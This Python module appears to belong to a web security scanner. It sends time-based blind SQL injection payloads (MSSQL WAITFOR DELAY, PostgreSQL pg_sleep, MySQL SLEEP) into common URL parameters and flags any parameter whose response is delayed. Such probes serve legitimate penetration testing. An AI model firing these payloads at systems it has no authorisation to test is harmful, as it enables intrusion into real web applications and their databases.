import asyncio
import time
from modules.core import console

# Blind SQLi Payloads (Time Based)
BLIND_SQLI_PAYLOADS = [
    "'; WAITFOR DELAY '0:0:5'--", # MSSQL
    "'; SELECT pg_sleep(5)--", # PostgreSQL
    "' AND SLEEP(5)--", # MySQL
    " OR SLEEP(5)--"
]

async def check_blind_sqli(session, url, param):
    try:
        for payload in BLIND_SQLI_PAYLOADS:
            target = f"{url}?{param}={payload}"
            if "?" in url: target = f"{url}&{param}={payload}"
            
            start_time = time.time()
            try:
                async with session.get(target, timeout=20, ssl=False) as resp:
                    await resp.read()
            except Exception:
                pass
            
            end_time = time.time()
            duration = end_time - start_time
            
            if duration >= 4.5:
                 return {
                    "url": target,
                    "param": param,
                    "type": "Silent SQLi (Time-Based)",
                    "payload": payload,
                    "duration": f"{duration:.2f}s"
                }
    except Exception:
        pass
    return None

async def scan_blind_sqli(session, url):
    """
    Scan for Silent SQLi (Blind).
    """
    console.print(f"\n[bold cyan]--- Silent SQLi (Blind) ---[/bold cyan]")
    
    params = ["id", "cat", "item", "user", "order", "sort"]
    
    tasks = [check_blind_sqli(session, url, p) for p in params]
    results = await asyncio.gather(*tasks)
    
    found = []
    for res in results:
        if res:
             console.print(f"  [bold red][!] SILENT SQLi CONFIRMED: {res['param']}[/bold red]")
             console.print(f"      Payload: {res['payload']}")
             console.print(f"      Duration: {res['duration']}")
             found.append(res)
             
    if not found:
        console.print("[dim][-] No blind SQLi detected.[/dim]")
        
    return found
